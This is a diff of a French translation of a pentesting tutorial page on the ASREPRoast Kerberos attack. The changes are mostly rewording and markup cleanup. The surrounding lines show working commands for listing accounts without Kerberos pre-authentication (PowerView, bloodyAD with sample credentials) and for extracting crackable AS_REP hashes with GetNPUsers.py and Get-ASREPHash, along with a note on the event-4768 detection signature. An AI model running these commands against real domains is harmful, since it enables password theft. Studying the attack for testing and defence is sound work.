@@ -25,13 +25,13 @@ Engagez-vous avec du contenu qui plonge dans le frisson et les défis du piratag
 Restez à jour avec le monde du piratage rapide grâce à des nouvelles et des aperçus en temps réel
 
 **Dernières annonces**\
-Restez informé avec les derniers lancements de primes de bugs et les mises à jour cruciales de la plateforme
+Restez informé avec les lancements de primes de bugs les plus récents et les mises à jour cruciales de la plateforme
 
 **Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez à collaborer avec les meilleurs hackers dès aujourd'hui !
 
 ## ASREPRoast
 
-L'attaque ASREPRoast recherche les **utilisateurs sans l'attribut de pré-authentification Kerberos requis (**[_**DONT\_REQ\_PREAUTH**_](https://support.microsoft.com/en-us/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro)_**)**_.
+L'attaque ASREPRoast recherche les **utilisateurs sans l'attribut requis de pré-authentification Kerberos (**[_**DONT\_REQ\_PREAUTH**_](https://support.microsoft.com/en-us/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro)_**)**_.
 
 Cela signifie que n'importe qui peut envoyer une demande AS\_REQ au DC au nom de l'un de ces utilisateurs, et recevoir un message AS\_REP. Ce dernier type de message contient un bloc de données chiffré avec la clé originale de l'utilisateur, dérivée de son mot de passe. Ensuite, en utilisant ce message, le mot de passe de l'utilisateur pourrait être craqué hors ligne.
 
@@ -51,13 +51,9 @@ Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```bash
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
 ```
-```markdown
-{% endcode %}
-
 #### Demander un message AS\_REP
 
 {% code title="Utilisation de Linux" %}
-```
 ```bash
 #Try all the usernames in usernames.txt
 python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
@@ -76,7 +72,7 @@ Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github
 {% endcode %}
 
 {% hint style="warning" %}
-Le AS-REP Roasting avec Rubeus générera un événement 4768 avec un type de chiffrement de 0x17 et un type de préauthentification de 0.
+AS-REP Roasting avec Rubeus générera un 4768 avec un type de chiffrement de 0x17 et un type de préauthentification de 0.
 {% endhint %}
 
 ### Cracking
